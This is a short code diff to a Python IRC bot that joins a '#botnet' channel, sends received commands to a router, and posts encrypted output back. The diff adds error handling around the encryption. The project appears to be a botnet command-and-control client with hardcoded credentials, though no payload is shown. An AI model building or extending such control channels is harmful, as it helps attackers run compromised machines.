@@ -11,6 +11,7 @@ settings_botpass = "password"
 settings_owner = "root"
 settings_commandprefix = "!"
 
+
 ircSession = irc.connect(settings_server, settings_port, settings_botnick, settings_botpass, "#botnet", settings_owner)
 
 while True:
@@ -33,8 +34,12 @@ while True:
                 else:
                     output = router.distribute(messageSent)
                     # encrypt output
-                    output = encrypt.encrypt(output)
-                    ircSession.send('PRIVMSG ' + messageChannel + ' :' + str(output) + '\r\n')
+                    try:
+                        output = encrypt.encrypt(output)
+                        output = unicode(output, "utf-8")
+                        ircSession.send('PRIVMSG ' + messageChannel + ' :' + str(output) + '\r\n')
+                    except:
+                        ircSession.send('PRIVMSG ' + messageChannel + ' :' + "Failed to encrypt." + '\r\n')
         if parseText[0] == "PING":
             # Respond to PINGs
             pingSender = parseText[1].split(":")[1]
